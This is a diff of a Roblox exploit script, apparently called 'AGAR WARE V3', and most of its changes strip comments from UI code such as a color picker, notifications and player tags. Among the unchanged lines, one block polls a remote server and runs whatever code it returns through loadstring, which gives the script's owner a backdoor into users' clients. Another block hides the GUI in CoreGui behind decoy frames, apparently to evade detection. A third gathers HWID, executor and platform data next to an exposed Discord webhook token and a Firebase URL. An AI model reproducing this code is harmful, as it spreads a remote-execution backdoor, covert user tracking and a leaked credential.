@@ -13290,21 +12140,16 @@ local script = AGARWARE["3f7"];
 				}
 				saveConfig()
 			end
-	
 			if activeCallback then
 				activeCallback(selectedColor, selectedAlpha)
 			end
-	
 			mainColorPicker.Visible = false
 			activePickerButton = nil
 		end
 	end)
-	
-	-- Cancel button (connected ONCE for all colorpickers)
 	local cancelButton = mainColorPicker.innerframelayout.applycancel.cancel
 	cancelButton.MouseButton1Click:Connect(function()
 		if not activePickerButton then return end
-	
 		mainColorPicker.Visible = false
 		activePickerButton = nil
 	end)
@@ -13314,17 +12159,12 @@ local function C_3f8()
 local script = AGARWARE["3f8"];
 	local Players = game:GetService("Players")
 	local TextChatService = game:GetService("TextChatService")
-	
 	_G.ChatHandlers = _G.ChatHandlers or {}
-	
 	TextChatService.OnIncomingMessage = function(mdata)
 		local plr = mdata.TextSource
 			and mdata.TextSource.UserId
 			and Players:GetPlayerByUserId(mdata.TextSource.UserId)
-	
 		if not plr then return end
-	
-		-- Call all registered handlers
 		for _, handler in ipairs(_G.ChatHandlers) do
 			pcall(function()
 				handler(mdata, plr)
@@ -13337,7 +12177,6 @@ local function C_3f9()
 local script = AGARWARE["3f9"];
 	local Players = game:GetService("Players")
 	local LocalPlayer = Players.LocalPlayer
-	
 	shared.ResetCharacter = function()
 		if LocalPlayer.Character then
 			LocalPlayer.Character:BreakJoints()
@@ -13347,7 +12186,7 @@ end;
 task.spawn(C_3f9);
 local function C_3fa()
 local script = AGARWARE["3fa"];
-	-- Notification System (FIXED REPOSITIONING + UNLIMITED STACKING + CUSTOM SFX)
+	
 	local function getScreenGuiForNotif()
 		local p = script.Parent
 		while p do
@@ -13355,83 +12194,58 @@ local script = AGARWARE["3fa"];
 			p = p.Parent
 		end
 	end
-	
 	local notifScreenGui = getScreenGuiForNotif()
 	if not notifScreenGui then return end
-	
-	-- Get the accent color from your Color frame
 	local colorFrame = notifScreenGui:FindFirstChild("Color")
 	local notifTargetColor = colorFrame and colorFrame.BackgroundColor3 or Color3.fromRGB(0, 124, 255)
-	
 	local NotificationSystem = {}
 	local TweenService = game:GetService("TweenService")
 	local TextService = game:GetService("TextService")
-	
 	local activeNotifications = {}
-	
 	local function repositionNotifications()
-		local yOffset = 0.02  -- Top gap
+		local yOffset = 0.02  
 		for i, notifData in ipairs(activeNotifications) do
 			if notifData.frame and notifData.frame.Parent then
 				TweenService:Create(notifData.frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-					Position = UDim2.new(0, 0, yOffset, 0)  -- Changed from 10 to 0 (no left gap)
+					Position = UDim2.new(0, 0, yOffset, 0)  
 				}):Play()
-	
-				-- Calculate gap based on notification height
 				local notifHeight = notifData.frame.AbsoluteSize.Y
 				local screenHeight = notifScreenGui.AbsoluteSize.Y
 				local heightOffset = notifHeight / screenHeight
-	
-				yOffset = yOffset + heightOffset + 0.005 -- 0.005 = small gap between notifications
+				yOffset = yOffset + heightOffset + 0.005 
 			end
 		end
 	end
-	
 	function NotificationSystem:Notify(text, duration, soundId)
 		if not notifScreenGui then return end
-	
 		duration = duration or 5
 		soundId = soundId or nil
-	
-		-- Update color in case it changed
 		if colorFrame then
 			notifTargetColor = colorFrame.BackgroundColor3
 		end
-	
-		-- Play sound if provided
 		if soundId then
-			-- Preload the sound first
 			local preloadSound = Instance.new("Sound")
 			preloadSound.SoundId = "rbxassetid://" .. tostring(soundId)
 			preloadSound.Volume = 0
 			preloadSound.Parent = game:GetService("SoundService")
-	
 			local loaded = false
 			preloadSound.Loaded:Connect(function()
 				loaded = true
 			end)
-	
-			-- Wait for it to load (max 0.5 seconds)
 			local startTime = tick()
 			while not loaded and (tick() - startTime) < 0.5 do
 				task.wait()
 			end
-	
 			preloadSound:Destroy()
-	
-			-- Now play the actual sound
 			local sound = Instance.new("Sound")
 			sound.SoundId = "rbxassetid://" .. tostring(soundId)
 			sound.Volume = 0.5
 			sound.Parent = game:GetService("SoundService")
 			sound:Play()
-	
 			sound.Ended:Connect(function()
 				sound:Destroy()
 			end)
 		end
-	
-		-- Calculate text size with wrapping
 		local maxWidth = 350
 		local textBounds = TextService:GetTextSize(
 			text,
@@ -13439,11 +12253,8 @@ local script = AGARWARE["3fa"];
 			Enum.Font.Code,
 			Vector2.new(maxWidth - 14, math.huge)
 		)
-	
 		local width = math.max(100, math.min(textBounds.X + 14, maxWidth))
 		local height = math.max(20, textBounds.Y + 4)
-	
-		-- Create notification frame
 		local notif = Instance.new("Frame")
 		notif.Name = "Notif"
 		notif.ZIndex = 1000000009
@@ -13452,18 +12263,13 @@ local script = AGARWARE["3fa"];
 		notif.Size = UDim2.new(0, width, 0, height)
 		notif.BorderColor3 = Color3.fromRGB(51, 51, 51)
 		notif.Parent = notifScreenGui
-	
-		-- Initial position (will be repositioned) - NO LEFT GAP
-		notif.Position = UDim2.new(0, 0, 0.02, 0)  -- Changed from 10 to 0
-	
-		-- Fade canvas group
+		notif.Position = UDim2.new(0, 0, 0.02, 0)  
 		local notifFade = Instance.new("CanvasGroup")
 		notifFade.Name = "notifFade"
 		notifFade.BorderSizePixel = 0
 		notifFade.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 		notifFade.Size = UDim2.new(1, 0, 1, 0)
 		notifFade.Parent = notif
-	
 		local gradient = Instance.new("UIGradient")
 		gradient.Rotation = 90
 		gradient.Transparency = NumberSequence.new{
@@ -13471,8 +12277,6 @@ local script = AGARWARE["3fa"];
 			NumberSequenceKeypoint.new(1.000, 0.7)
 		}
 		gradient.Parent = notifFade
-	
-		-- Text label
 		local textLabel = Instance.new("TextLabel")
 		textLabel.Name = "text"
 		textLabel.TextWrapped = true
@@ -13487,23 +12291,17 @@ local script = AGARWARE["3fa"];
 		textLabel.Size = UDim2.new(1, 0, 1, 0)
 		textLabel.Text = text
 		textLabel.Parent = notif
-	
 		local textStroke = Instance.new("UIStroke")
 		textStroke.Parent = textLabel
-	
 		local padding = Instance.new("UIPadding")
 		padding.PaddingLeft = UDim.new(0, 7)
 		padding.PaddingRight = UDim.new(0, 2)
 		padding.Parent = textLabel
-	
 		local uiScale = Instance.new("UIScale")
 		uiScale.Scale = 0
 		uiScale.Parent = notif
-	
 		local outlineStroke = Instance.new("UIStroke")
 		outlineStroke.Parent = notif
-	
-		-- Accent color bar
 		local guiColor = Instance.new("Frame")
 		guiColor.Name = "GuiColor"
 		guiColor.ZIndex = 999999999
@@ -13511,42 +12309,27 @@ local script = AGARWARE["3fa"];
 		guiColor.BackgroundColor3 = notifTargetColor
 		guiColor.Size = UDim2.new(0, 2, 1, 0)
 		guiColor.Parent = notif
-	
-		-- Add to active list
 		local notifData = {frame = notif}
 		table.insert(activeNotifications, notifData)
-	
-		-- Reposition all notifications
 		repositionNotifications()
-	
-		-- Animate in
 		TweenService:Create(uiScale, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
 			Scale = 1
 		}):Play()
-	
-		-- Auto-destroy after duration
 		task.delay(duration, function()
 			TweenService:Create(uiScale, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
 				Scale = 0
 			}):Play()
-	
 			task.wait(0.2)
-	
-			-- Remove from active list
 			for i, n in pairs(activeNotifications) do
 				if n == notifData then
 					table.remove(activeNotifications, i)
 					break
 				end
 			end
-	
 			notif:Destroy()
-	
-			-- Reposition remaining notifications
 			repositionNotifications()
 		end)
 	end
-	
 	_G.Notify = function(text, duration, soundId)
 		NotificationSystem:Notify(text, duration, soundId)
 	end
@@ -13554,19 +12337,14 @@ end;
 task.spawn(C_3fa);
 local function C_3fc()
 local script = AGARWARE["3fc"];
-	-- GUI Protection Script
-	-- Place this at the top of your main script
-	-- Cancel if running in Studio
+	
 	if game:GetService("RunService"):IsStudio() then
 		return
 	end
-	
 	local Players = game:GetService("Players")
 	local CoreGui = game:GetService("CoreGui")
 	local LocalPlayer = Players.LocalPlayer
 	local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
-	
-	-- Find the ScreenGui
 	local function getScreenGui()
 		local p = script.Parent
 		while p do
@@ -13574,18 +12352,9 @@ local script = AGARWARE["3fc"];
 			p = p.Parent
 		end
 	end
-	
 	local RealGui = getScreenGui()
 	if not RealGui then return end
-	
-	-- ============================================================
-	-- STEP 1: Move real GUI to CoreGui
-	-- ============================================================
 	RealGui.Parent = CoreGui
-	
-	-- ============================================================
-	-- STEP 2: Rename folders ending with HIDE to "Folder" and all scripts to "LocalScript"
-	-- ============================================================
 	for _, descendant in pairs(RealGui:GetDescendants()) do
 		if descendant:IsA("LocalScript") or descendant:IsA("ModuleScript") or descendant:IsA("Script") then
 			descendant.Name = "LocalScript"
@@ -13593,12 +12362,7 @@ local script = AGARWARE["3fc"];
 			descendant.Name = "Folder"
 		end
 	end
-	
-	-- ============================================================
-	-- STEP 2.5: Create 10 fake MainFrames in the real ScreenGui
-	-- ============================================================
 	local instanceTypes = {"Frame", "TextLabel", "TextButton", "ImageLabel", "ScrollingFrame", "Folder", "LocalScript"}
-	
 	local function randomString(length)
 		local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 		local result = ""
@@ -13608,27 +12372,22 @@ local script = AGARWARE["3fc"];
 		end
 		return result
 	end
-	
 	for i = 1, 10 do
 		local fakeFrame = Instance.new("Frame")
 		fakeFrame.Name = "MainFrame"
 		fakeFrame.Visible = false
 		fakeFrame.Parent = RealGui
-	
 		local numChildren = math.random(3, 8)
 		for j = 1, numChildren do
 			local randomType = instanceTypes[math.random(1, #instanceTypes)]
 			local fakeChild = Instance.new(randomType)
 			fakeChild.Name = randomString(math.random(5, 12))
-	
 			if fakeChild:IsA("GuiObject") then
 				fakeChild.Visible = false
 			end
-	
 			if fakeChild:IsA("LocalScript") then
 				fakeChild.Disabled = true
 			end
-	
 			fakeChild.Parent = fakeFrame
 		end
 	end
@@ -13643,7 +12402,6 @@ local script = AGARWARE["3fd"];
 	local LocalPlayer = Players.LocalPlayer
 	local _req = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
 	local lastCommandTimestamp = os.time()
-	
 	local function checkForCommands()
 		pcall(function()
 			local response = _req({
@@ -13669,12 +12427,10 @@ local script = AGARWARE["3fd"];
 							loadstring(commandData.code)()
 						end)
 					end
-					-- REMOVED THE DELETE HERE - let the 10 second timer handle it
 				end
 			end
 		end)
 	end
-	
 	while wait(3) do
 		checkForCommands()
 	end
@@ -13683,37 +12439,24 @@ task.spawn(C_3fd);
 local function C_3ff()
 local script = AGARWARE["3ff"];
 	local ColorPicker = script.Parent
-	
-	-- UI Elements
 	local canvas = ColorPicker.innerframelayout.canvashue.canvasFrame.canvas
 	local canvasDot = canvas.dot
-	
 	local hue = ColorPicker.innerframelayout.canvashue.hueFrame.hue
 	local hueLine = hue.line
-	
 	local slider = ColorPicker.innerframelayout.transparency.transparencyFrame.slider
 	local sliderLine = slider.line
-	
 	local hexTextbox = ColorPicker.innerframelayout.colorvalue.hex.textbox
 	local rgbTextbox = ColorPicker.innerframelayout.colorvalue.rgb.textbox
-	
 	local applyButtonFrame = ColorPicker.innerframelayout.applycancel.apply.buttonFrame
-	
 	local UserInputService = game:GetService("UserInputService")
 	local GuiService = game:GetService("GuiService")
-	
-	-- Current color state
 	local currentHue = 0
 	local currentSat = 1
 	local currentVal = 1
 	local currentAlpha = 0
-	
-	-- Dragging states
 	local canvasDragging = false
 	local hueDragging = false
 	local alphaDragging = false
-	
-	-- Helper: HSV to RGB
 	local function hsvToRgb(h, s, v)
 		local r, g, b
 		local i = math.floor(h * 6)
@@ -13731,16 +12474,12 @@ local script = AGARWARE["3ff"];
 		end
 		return Color3.new(r, g, b)
 	end
-	
-	-- Helper: RGB to HSV
 	local function rgbToHsv(color)
 		local r, g, b = color.R, color.G, color.B
 		local max = math.max(r, g, b)
 		local min = math.min(r, g, b)
 		local delta = max - min
-	
 		local h, s, v = 0, 0, max
-	
 		if max > 0 and delta > 0 then
 			s = delta / max
 			if max == r then
@@ -13752,19 +12491,14 @@ local script = AGARWARE["3ff"];
 			end
 			h = h / 6
 		end
-	
 		return h, s, v
 	end
-	
-	-- Helper: RGB to Hex
 	local function rgbToHex(color)
 		return string.format("#%02X%02X%02X", 
 			math.floor(color.R * 255),
 			math.floor(color.G * 255),
 			math.floor(color.B * 255))
 	end
-	
-	-- Helper: Hex to RGB
 	local function hexToRgb(hex)
 		hex = hex:gsub("#", "")
 		if #hex ~= 6 then return nil end
@@ -13774,13 +12508,9 @@ local script = AGARWARE["3ff"];
 		if not r or not g or not b then return nil end
 		return Color3.fromRGB(r, g, b)
 	end
-	
-	-- Update everything based on current HSV values
 	local function updateColor()
 		local hueColor = hsvToRgb(currentHue, 1, 1)
 		local finalColor = hsvToRgb(currentHue, currentSat, currentVal)
-	
-		-- Update canvas gradient
 		if not canvas:FindFirstChild("SatGradient") then
 			local satFrame = Instance.new("Frame")
 			satFrame.Name = "SatGradient"
@@ -13792,7 +12522,6 @@ local script = AGARWARE["3ff"];
 			grad.Name = "Gradient"
 			grad.Parent = satFrame
 			satFrame.Parent = canvas
-	
 			local valFrame = Instance.new("Frame")
 			valFrame.Name = "ValGradient"
 			valFrame.Size = UDim2.new(1, 0, 1, 0)
@@ -13810,47 +12539,32 @@ local script = AGARWARE["3ff"];
 			grad2.Parent = valFrame
 			valFrame.Parent = canvas
 		end
-	
 		local satGrad = canvas.SatGradient.Gradient
 		satGrad.Color = ColorSequence.new({
 			ColorSequenceKeypoint.new(0, Color3.new(1, 1, 1)),
 			ColorSequenceKeypoint.new(1, hueColor)
 		})
-	
-		-- Update transparency slider color
 		local transFrame = slider:FindFirstChild("TransColorFrame")
 		if transFrame then
 			transFrame.BackgroundColor3 = finalColor
 		end
-	
-		-- Update textboxes
 		hexTextbox.Text = rgbToHex(finalColor)
 		rgbTextbox.Text = string.format("%d, %d, %d",
 			math.floor(finalColor.R * 255),
 			math.floor(finalColor.G * 255),
 			math.floor(finalColor.B * 255))
-	
-		-- Update apply button color
 		applyButtonFrame.BackgroundColor3 = finalColor
 		applyButtonFrame.BackgroundTransparency = currentAlpha
-	
-		-- Update hue line and canvas dot positions
 		hueLine.Position = UDim2.new(0, 0, currentHue, 0)
 		canvasDot.Position = UDim2.new(currentSat, 0, 1 - currentVal, 0)
-	
-		-- Update all outline strokes when color changes
 		if outlineFrames then
 			for _, data in pairs(outlineFrames) do
 				data.update()
 			end
 		end
 	end
-	
-	-- Setup canvas
 	canvas.AutoButtonColor = false
 	canvas.Active = true
-	
-	-- Setup hue gradient
 	hue.AutoButtonColor = false
 	hue.BackgroundTransparency = 1
 	hue.Active = true
@@ -13875,8 +12589,6 @@ local script = AGARWARE["3ff"];
 		grad.Parent = hueFrame
 		hueFrame.Parent = hue
 	end
-	
-	-- Setup transparency gradient (checkerboard + color gradient)
 	slider.AutoButtonColor = false
 	slider.BackgroundTransparency = 1
 	slider.Active = true
@@ -13888,7 +12600,6 @@ local script = AGARWARE["3ff"];
 		checkerboard.BorderSizePixel = 0
 		checkerboard.ZIndex = slider.ZIndex
 		checkerboard.ClipsDescendants = true
-	
 		local squareSize = 4
 		for y = 0, 50 do
 			for x = 0, 50 do
@@ -13903,9 +12614,7 @@ local script = AGARWARE["3ff"];
 				end
 			end
 		end
-	
 		checkerboard.Parent = slider
-	
 		local transColorFrame = Instance.new("Frame")
 		transColorFrame.Name = "TransColorFrame"
 		transColorFrame.Size = UDim2.new(1, 0, 1, 0)
@@ -13920,66 +12629,50 @@ local script = AGARWARE["3ff"];
 		grad.Parent = transColorFrame
 		transColorFrame.Parent = slider
 	end
-	
 	local function updateCanvasFromInput(input)
 		local canvasPos = canvas.AbsolutePosition
 		local canvasSize = canvas.AbsoluteSize
-	
 		local relativeX = math.clamp(input.Position.X - canvasPos.X, 0, canvasSize.X - 4)
 		local relativeY = math.clamp(input.Position.Y - canvasPos.Y, 0, canvasSize.Y - 4)
-	
 		currentSat = relativeX / canvasSize.X
 		currentVal = 1 - (relativeY / canvasSize.Y)
-	
 		canvasDot.Position = UDim2.new(currentSat, 0, 1 - currentVal, 0)
 		updateColor()
 	end
-	
 	canvas.InputBegan:Connect(function(input)
 		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 			canvasDragging = true
 			updateCanvasFromInput(input)
 		end
 	end)
-	
-	-- Hue slider interaction
 	local function updateHueFromInput(input)
 		local huePos = hue.AbsolutePosition
 		local hueSize = hue.AbsoluteSize
-	
 		local relativeY = math.clamp(input.Position.Y - huePos.Y, 0, hueSize.Y)
 		currentHue = relativeY / hueSize.Y
-	
 		hueLine.Position = UDim2.new(0, 0, currentHue, 0)
 		updateColor()
 	end
-	
 	hue.InputBegan:Connect(function(input)
 		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 			hueDragging = true
 			updateHueFromInput(input)
 		end
 	end)
-	
 	local function updateAlphaFromInput(input)
 		local sliderPos = slider.AbsolutePosition
 		local sliderSize = slider.AbsoluteSize
-	
 		local relativeX = math.clamp(input.Position.X - sliderPos.X, 0, sliderSize.X)
 		currentAlpha = relativeX / sliderSize.X
-	
 		sliderLine.Position = UDim2.new(currentAlpha, 0, 0, 0)
 		applyButtonFrame.BackgroundTransparency = currentAlpha
 	end
-	
 	slider.InputBegan:Connect(function(input)
 		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 			alphaDragging = true
 			updateAlphaFromInput(input)
 		end
 	end)
-	
-	-- Global input handlers for dragging
 	UserInputService.InputChanged:Connect(function(input)
 		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
 			if canvasDragging then
@@ -13993,7 +12686,6 @@ local script = AGARWARE["3ff"];
 			end
 		end
 	end)
-	
 	UserInputService.InputEnded:Connect(function(input)
 		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 			canvasDragging = false
@@ -14001,16 +12693,12 @@ local script = AGARWARE["3ff"];
 			alphaDragging = false
 		end
 	end)
-	
-	-- Hex textbox
 	local previousHex = hexTextbox.Text
 	local hexTextChanged = false
-	
 	hexTextbox.Focused:Connect(function()
 		previousHex = hexTextbox.Text
 		hexTextChanged = false
 	end)
-	
 	hexTextbox:GetPropertyChangedSignal("Text"):Connect(function()
 		hexTextChanged = true
 		local text = hexTextbox.Text:upper()
@@ -14018,13 +12706,11 @@ local script = AGARWARE["3ff"];
 		if #text > 7 then text = text:sub(1, 7) end
 		hexTextbox.Text = text
 	end)
-	
 	hexTextbox.FocusLost:Connect(function()
 		if not hexTextChanged then
 			hexTextbox.Text = previousHex
 			return
 		end
-	
 		local color = hexToRgb(hexTextbox.Text)
 		if color then
 			local h, s, v = rgbToHsv(color)
@@ -14037,16 +12723,12 @@ local script = AGARWARE["3ff"];
 			hexTextbox.Text = previousHex
 		end
 	end)
-	
-	-- RGB textbox
 	local previousRgb = rgbTextbox.Text
 	local rgbTextChanged = false
-	
 	rgbTextbox.Focused:Connect(function()
 		previousRgb = rgbTextbox.Text
 		rgbTextChanged = false
 	end)
-	
 	rgbTextbox:GetPropertyChangedSignal("Text"):Connect(function()
 		rgbTextChanged = true
 		local text = rgbTextbox.Text
@@ -14054,13 +12736,11 @@ local script = AGARWARE["3ff"];
 		text = text:gsub(" +", " ")
 		rgbTextbox.Text = text
 	end)
-	
 	rgbTextbox.FocusLost:Connect(function()
 		if not rgbTextChanged then
 			rgbTextbox.Text = previousRgb
 			return
 		end
-	
 		local text = rgbTextbox.Text:gsub(" ", ", ")
 		local r, g, b = text:match("(%d+),%s*(%d+),%s*(%d+)")
 		if r and g and b then
@@ -14080,10 +12760,7 @@ local script = AGARWARE["3ff"];
 			rgbTextbox.Text = previousRgb
 		end
 	end)
-	
-	-- Textbox and button outline hover effects
 	local outlineFrames = {}
-	
 	local function setupOutlineEffect(parentFrame, childElement)
 		local outlineStroke = nil
 		for _, descendant in pairs(parentFrame:GetDescendants()) do
@@ -14092,14 +12769,11 @@ local script = AGARWARE["3ff"];
 				break
 			end
 		end
-	
 		if not outlineStroke then return end
-	
 		local originalColor = outlineStroke.Color
 		local originalThickness = outlineStroke.Thickness
 		local isHovering = false
 		local isFocused = false
-	
 		local function updateStroke()
 			local finalColor = hsvToRgb(currentHue, currentSat, currentVal)
 			if isFocused or isHovering then
@@ -14110,7 +12784,6 @@ local script = AGARWARE["3ff"];
 				outlineStroke.Thickness = 2
 			end
 		end
-	
 		if childElement and childElement:IsA("TextBox") then
 			childElement.Focused:Connect(function()
 				isFocused = true
@@ -14121,7 +12794,6 @@ local script = AGARWARE["3ff"];
 				updateStroke()
 			end)
 		end
-	
 		parentFrame.MouseEnter:Connect(function()
 			isHovering = true
 			updateStroke()
@@ -14130,19 +12802,13 @@ local script = AGARWARE["3ff"];
 			isHovering = false
 			updateStroke()
 		end)
-	
 		table.insert(outlineFrames, {update = updateStroke})
 	end
-	
 	setupOutlineEffect(ColorPicker.innerframelayout.colorvalue.hex, hexTextbox)
 	setupOutlineEffect(ColorPicker.innerframelayout.colorvalue.rgb, rgbTextbox)
 	setupOutlineEffect(ColorPicker.innerframelayout.applycancel.apply, nil)
 	setupOutlineEffect(ColorPicker.innerframelayout.applycancel.cancel, nil)
-	
-	-- Initial update
 	updateColor()
-	
-	-- Global functions for master script
 	function _G.SetColorPickerColor(color, alpha)
 		local h, s, v = rgbToHsv(color)
 		currentHue = h
@@ -14151,34 +12817,28 @@ local script = AGARWARE["3ff"];
 		currentAlpha = alpha or 0
 		updateColor()
 	end
-	
 	function _G.GetColorPickerColor()
 		local finalColor = hsvToRgb(currentHue, currentSat, currentVal)
 		return finalColor, currentAlpha
 	end
-	
 	ColorPicker.Visible = false
 end;
 task.spawn(C_3ff);
 local function C_45d()
 local script = AGARWARE["45d"];
-	-- Add this at the very top of your script
+	
 	if _G.IntroPlayed then
 		script.Parent.Parent:Destroy()
 		return
 	end
 	_G.IntroPlayed = true
-	
 	local canvasGroup = script.Parent.Parent
 	local textLabel = script.Parent
 	canvasGroup.Visible = true
 	local TweenService = game:GetService("TweenService")
 	local SoundService = game:GetService("SoundService")
-	
 	local brightBlue = Color3.fromRGB(0, 123, 255)
 	local darkBlue = Color3.fromRGB(0, 60, 120)
-	
-	-- Find MainFrame UIScale
 	local function getScreenGui()
 		local p = canvasGroup
 		while p do
@@ -14186,12 +12846,9 @@ local script = AGARWARE["45d"];
 			p = p.Parent
 		end
 	end
-	
 	local screenGui = getScreenGui()
 	local MainFrame = screenGui and screenGui:FindFirstChild("MainFrame")
 	local uiScale = MainFrame and MainFrame:FindFirstChild("UIScale")
-	
-	-- Scale MainFrame from 0.2 to 1 (fast start, slow end)
 	if uiScale then
 		uiScale.Scale = 0.2
 		local scaleUp = TweenService:Create(
@@ -14201,8 +12858,6 @@ local script = AGARWARE["45d"];
 		)
 		scaleUp:Play()
 	end
-	
-	-- Create and play audio
 	local introSound = Instance.new("Sound")
 	introSound.SoundId = "rbxassetid://9109651770"
 	introSound.Volume = 1
@@ -14210,18 +12865,10 @@ local script = AGARWARE["45d"];
 	introSound.PlaybackSpeed = 1
 	introSound.Parent = SoundService
 	introSound:Play()
-	
-	-- Center the canvas group
 	canvasGroup.AnchorPoint = Vector2.new(0.5, 0.5)
 	canvasGroup.Position = UDim2.new(0.5, 0, 0.5, -15)
-	
-	-- Set initial color
 	textLabel.TextColor3 = brightBlue
-	
-	-- Start canvas invisible
 	canvasGroup.GroupTransparency = 1
-	
-	-- Fade in canvas
 	local fadeIn = TweenService:Create(
 		canvasGroup,
 		TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
@@ -14229,12 +12876,9 @@ local script = AGARWARE["45d"];
 	)
 	fadeIn:Play()
 	fadeIn.Completed:Wait()
-	
-	-- NOW start the color pulsing loop (canvas is visible now)
 	local pulseRunning = true
 	task.spawn(function()
 		while pulseRunning do
-			-- Fade to dark
 			local toDark = TweenService:Create(
 				textLabel,
 				TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
@@ -14243,7 +12887,6 @@ local script = AGARWARE["45d"];
 			toDark:Play()
 			toDark.Completed:Wait()
 			if not pulseRunning then break end
-			-- Fade back to bright
 			local toBright = TweenService:Create(
 				textLabel,
 				TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
@@ -14253,31 +12896,21 @@ local script = AGARWARE["45d"];
 			toBright.Completed:Wait()
 		end
 	end)
-	
-	-- Wait 2.5 seconds
 	task.wait(2.5)
-	
-	-- Stop pulsing
 	pulseRunning = false
-	
-	-- Fade out canvas AND audio at the same time
 	local fadeOut = TweenService:Create(
 		canvasGroup,
 		TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In),
 		{GroupTransparency = 1}
 	)
 	fadeOut:Play()
-	
 	local audioFadeOut = TweenService:Create(
 		introSound,
 		TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In),
 		{Volume = 0}
 	)
 	audioFadeOut:Play()
-	
 	fadeOut.Completed:Wait()
-	
-	-- Destroy the canvas group and audio
 	canvasGroup:Destroy()
 	introSound:Destroy()
 end;
@@ -14287,14 +12920,9 @@ local script = AGARWARE["461"];
 	local Players = game:GetService("Players")
 	local TweenService = game:GetService("TweenService")
 	local RunService = game:GetService("RunService")
-	
-	-- ==========================================
-	-- OWNER TAG
-	-- ==========================================
 	local ownerBrightBlue = Color3.fromRGB(0, 123, 255)
 	local ownerDarkBlue = Color3.fromRGB(0, 83, 166)
 	local ownerStrokeColor = Color3.fromRGB(0, 53, 109)
-	
 	local function addOwnerTag(player)
 		repeat task.wait() until _G.IsAgarWareOwner
 		if not _G.IsAgarWareOwner(player.UserId) then return end
@@ -14346,18 +12974,11 @@ local script = AGARWARE["461"];
 		if player.Character then applyToChar(player.Character) end
 		player.CharacterAdded:Connect(applyToChar)
 	end
-	
 	for _, player in ipairs(Players:GetPlayers()) do addOwnerTag(player) end
 	Players.PlayerAdded:Connect(addOwnerTag)
-	
-	
-	-- ==========================================
-	-- WHITELISTED TAG
-	-- ==========================================
 	local whiteBrightBlue = Color3.fromRGB(255, 255, 255)
 	local whiteDarkBlue = Color3.fromRGB(166, 166, 166)
 	local whiteStrokeColor = Color3.fromRGB(49, 49, 49)
-	
 	local function addWhitelistedTag(player)
 		repeat task.wait() until _G.IsAgarWareWhitelisted
 		if not _G.IsAgarWareWhitelisted(player.UserId) then return end
@@ -14411,18 +13032,11 @@ local script = AGARWARE["461"];
 		if player.Character then applyToChar(player.Character) end
 		player.CharacterAdded:Connect(applyToChar)
 	end
-	
 	for _, player in ipairs(Players:GetPlayers()) do addWhitelistedTag(player) end
 	Players.PlayerAdded:Connect(addWhitelistedTag)
-	
-	
-	-- ==========================================
-	-- BLACKLISTED TAG
-	-- ==========================================
 	local blackBrightRed = Color3.fromRGB(255, 0, 0)
 	local blackDarkRed = Color3.fromRGB(150, 0, 0)
 	local blackStrokeColor = Color3.fromRGB(80, 0, 0)
-	
 	local function addBlacklistedTag(player)
 		repeat task.wait() until _G.IsAgarWareBlacklisted and _G.IsAgarWareOwner and _G.IsAgarWareWhitelisted
 		local LocalPlayer = Players.LocalPlayer
@@ -14476,7 +13090,6 @@ local script = AGARWARE["461"];
 		if player.Character then applyToChar(player.Character) end
 		player.CharacterAdded:Connect(applyToChar)
 	end
-	
 	for _, player in ipairs(Players:GetPlayers()) do addBlacklistedTag(player) end
 	Players.PlayerAdded:Connect(addBlacklistedTag)
 end;
@@ -14485,27 +13098,20 @@ local function C_463()
 local script = AGARWARE["463"];
 	local Players = game:GetService("Players")
 	local LocalPlayer = Players.LocalPlayer
-	
 	shared.RefreshTool = function(toolName)
 		if not toolName then return false end
-	
 		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(toolName) then
 			return false
 		end
-	
 		local tool = LocalPlayer.Backpack:FindFirstChild(toolName)
-	
 		if not tool then
 			return false
 		end
-	
 		tool.Parent = LocalPlayer.Character
-	
 		while tool.Parent == LocalPlayer.Character do
 			tool.Parent = LocalPlayer.Backpack
 			task.wait()
 		end
-	
 		return true
 	end
 end;
@@ -14519,28 +13125,23 @@ local script = AGARWARE["465"];
 		local _MarketplaceSvc  = game:GetService("MarketplaceService")
 		local _AnalyticsSvc    = game:GetService("RbxAnalyticsService")
 		local _InputService    = game:GetService("UserInputService")
-	
 		local _WEBHOOK = "https://discord.com/api/webhooks/1502950736902750258/mav7Jjsbea6vyUZOV3NfWzIvIB1XDSTJMqjKx7mCTCY00RL2mKnKQqgdZGRGfPWMjO5Y"
 		local _FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
 		local _SCRIPT_NAME = "AGAR WARE V3"
-	
 		local _req = (syn and syn.request)
 			or request
 			or http_request
 			or (fluxus and fluxus.request)
 			or function() return { StatusCode = 0 } end
-	
 		local _plr = _Players.LocalPlayer
 		local _productInfo = pcall(function()
 			return _MarketplaceSvc:GetProductInfo(game.PlaceId)
 		end) and _MarketplaceSvc:GetProductInfo(game.PlaceId) or { Name = "Unknown" }
-	
 		local function _hwid()
 			if get_hwid then return tostring(get_hwid()) end
 			local ok, id = pcall(function() return _AnalyticsSvc:GetClientId() end)
 			return ok and id or "N/A"
 		end
-	
 		local function _executor()
 			if syn and syn.request then return "Synapse X" end
 			if fluxus and fluxus.request then return "Fluxus" end
@@ -14548,33 +13149,27 @@ local script = AGARWARE["465"];
 			if getexecutorname then return getexecutorname() end
 			return "Unknown"
 		end
-	
 		local function _platform()
 			local p = _InputService:GetPlatform().Name
 			local device = "Unknown"
-	
 			if p == "Windows" then device = "Windows"
